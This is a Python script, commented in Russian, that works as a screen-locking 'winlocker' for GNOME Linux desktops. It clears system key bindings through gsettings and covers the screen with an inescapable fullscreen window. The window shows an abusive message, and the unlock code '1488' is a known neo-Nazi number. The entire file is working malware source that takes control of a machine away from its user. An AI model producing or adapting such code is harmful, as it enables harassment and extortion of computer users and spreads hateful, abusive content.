#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import tkinter as tk
from tkinter import Entry, Button, Label, Frame
import threading

# ===== БЛОКИРОВКА ВСЕХ БИНДОВ =====
def block_binds():
    # Alt+Tab, Alt+F4, Ctrl+Alt+Del
    os.system('gsettings set org.gnome.desktop.wm.keybindings switch-windows "[]"')
    os.system('gsettings set org.gnome.desktop.wm.keybindings switch-applications "[]"')
    os.system('gsettings set org.gnome.desktop.wm.keybindings close "[]"')
    os.system('gsettings set org.gnome.mutter.keybindings toggle-tiled-left "[]"')
    os.system('gsettings set org.gnome.mutter.keybindings toggle-tiled-right "[]"')
    
    # Super (Win) + D, Super (Win)
    os.system('gsettings set org.gnome.desktop.wm.keybindings show-desktop "[]"')
    os.system('gsettings set org.gnome.shell.keybindings open-application-menu "[]"')
    os.system('gsettings set org.gnome.shell.keybindings toggle-message-tray "[]"')
    os.system('gsettings set org.gnome.shell.keybindings focus-active-notification "[]"')
    
    # Ctrl+Alt+Del
    try:
        os.system('gsettings set org.gnome.settings-daemon.plugins.media-keys logout "[]"')
    except:
        pass

# ===== ВИНЛОКЕР =====
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("LOCKED")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        
        # Блокируем выход
        self.root.overrideredirect(True)
        self.root.bind('<Escape>', lambda e: None)
        self.root.bind('<Alt-Tab>', lambda e: None)
        self.root.bind('<Alt-F4>', lambda e: None)
        self.root.bind('<Control-Alt-Delete>', lambda e: None)
        self.root.bind('<Super_L>', lambda e: None)
        self.root.bind('<Super_R>', lambda e: None)
        self.root.bind('<Super-D>', lambda e: None)
        self.root.bind('<Control-Alt-T>', lambda e: None)
        
        # Запрещаем изменение размера
        self.root.resizable(False, False)

        # ===== ГЛАВНЫЙ ФРЕЙМ =====
        main_frame = Frame(self.root, bg='black')
        main_frame.pack(expand=True)

        # ===== ПАНЕЛЬ С ЦИФРАМИ =====
        panel_frame = Frame(main_frame, bg='black')
        panel_frame.pack(pady=50)

        # Отображаем введённый код
        self.display_var = tk.StringVar()
        self.display_var.set("")

        display = Entry(
            panel_frame,
            textvariable=self.display_var,
            font=("Courier", 40, "bold"),
            bg='black',
            fg='red',
            justify='center',
            width=20,
            bd=0,
            highlightthickness=0,
            state='readonly'
        )
        display.pack(pady=20)

        # Строка ввода (скрытая)
        self.password_entry = Entry(
            panel_frame,
            font=("Courier", 1),
            bg='black',
            fg='black',
            bd=0,
            highlightthickness=0
        )
        self.password_entry.pack()
        self.password_entry.focus_set()

        # ===== ТЕКСТ "YOUR LOCKED BITCH" =====
        text_label = Label(
            main_frame,
            text="YOUR LOCKED BITCH",
            font=("Courier", 50, "bold"),
            bg='black',
            fg='red'
        )
        text_label.pack(pady=50)

        # ===== КНОПКИ ЦИФР =====
        button_frame = Frame(main_frame, bg='black')
        button_frame.pack(pady=20)

        self.create_buttons(button_frame)

        # ===== ПРИВЯЗКА КЛАВИШ =====
        self.root.bind('<Key>', self.on_key_press)
        self.root.bind('<BackSpace>', self.on_backspace)
        self.root.focus_set()

        # ===== ЗАПУСК БЛОКИРОВКИ БИНДОВ =====
        block_binds()

        self.root.mainloop()

    def create_buttons(self, frame):
        buttons = [
            ['1', '2', '3'],
            ['4', '5', '6'],
            ['7', '8', '9'],
            ['', '0', '⌫']
        ]

        for row in buttons:
            row_frame = Frame(frame, bg='black')
            row_frame.pack()
            for label in row:
                if label == '':
                    btn = Button(
                        row_frame,
                        text="",
                        font=("Courier", 20, "bold"),
                        bg='black',
                        fg='red',
                        relief='flat',
                        width=6,
                        height=2,
                        state='disabled'
                    )
                elif label == '⌫':
                    btn = Button(
                        row_frame,
                        text=label,
                        font=("Courier", 20, "bold"),
                        bg='black',
                        fg='red',
                        relief='flat',
                        width=6,
                        height=2,
                        command=self.on_backspace
                    )
                else:
                    btn = Button(
                        row_frame,
                        text=label,
                        font=("Courier", 20, "bold"),
                        bg='black',
                        fg='red',
                        relief='flat',
                        width=6,
                        height=2,
                        command=lambda l=label: self.on_digit(l)
                    )
                btn.pack(side=tk.LEFT, padx=5, pady=5)

    def on_digit(self, digit):
        current = self.display_var.get()
        if len(current) < 12:
            new = current + digit
            self.display_var.set(new)
            self.password_entry.insert(tk.END, digit)
            self.check_password()

    def on_backspace(self, event=None):
        current = self.display_var.get()
        if current:
            self.display_var.set(current[:-1])
            self.password_entry.delete(len(current)-1, tk.END)

    def on_key_press(self, event):
        if event.char.isdigit():
            self.on_digit(event.char)
        elif event.keysym == 'Return':
            self.check_password()
        elif event.keysym == 'BackSpace':
            self.on_backspace()

    def check_password(self):
        password = self.password_entry.get()
        if password == '1488':
            self.unlock()

    def unlock(self):
        # Возвращаем бинды
        os.system('gsettings reset org.gnome.desktop.wm.keybindings switch-windows')
        os.system('gsettings reset org.gnome.desktop.wm.keybindings switch-applications')
        os.system('gsettings reset org.gnome.desktop.wm.keybindings close')
        os.system('gsettings reset org.gnome.mutter.keybindings toggle-tiled-left')
        os.system('gsettings reset org.gnome.mutter.keybindings toggle-tiled-right')
        os.system('gsettings reset org.gnome.desktop.wm.keybindings show-desktop')
        os.system('gsettings reset org.gnome.shell.keybindings open-application-menu')
        os.system('gsettings reset org.gnome.shell.keybindings toggle-message-tray')
        os.system('gsettings reset org.gnome.shell.keybindings focus-active-notification')
        try:
            os.system('gsettings reset org.gnome.settings-daemon.plugins.media-keys logout')
        except:
            pass

        self.root.destroy()
        sys.exit(0)

if __name__ == "__main__":
    locker = WinLocker()
